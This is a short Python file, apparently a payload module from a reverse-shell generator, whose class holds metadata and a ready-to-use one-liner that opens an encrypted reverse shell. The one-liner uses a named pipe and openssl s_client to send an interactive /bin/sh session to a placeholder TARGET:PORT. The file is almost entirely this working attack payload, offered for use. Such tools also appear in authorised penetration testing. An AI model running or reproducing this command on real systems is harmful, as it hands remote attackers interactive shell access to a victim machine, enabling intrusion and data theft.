class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple reverse shell using openssl."
    function    = "reverse shell"
    liner       = "mkfifo /tmp/VAR1; /bin/sh -i < /tmp/VAR1 2>&1 | openssl s_client -quiet -connect TARGET:PORT > /tmp/VAR1; rm /tmp/VAR1"
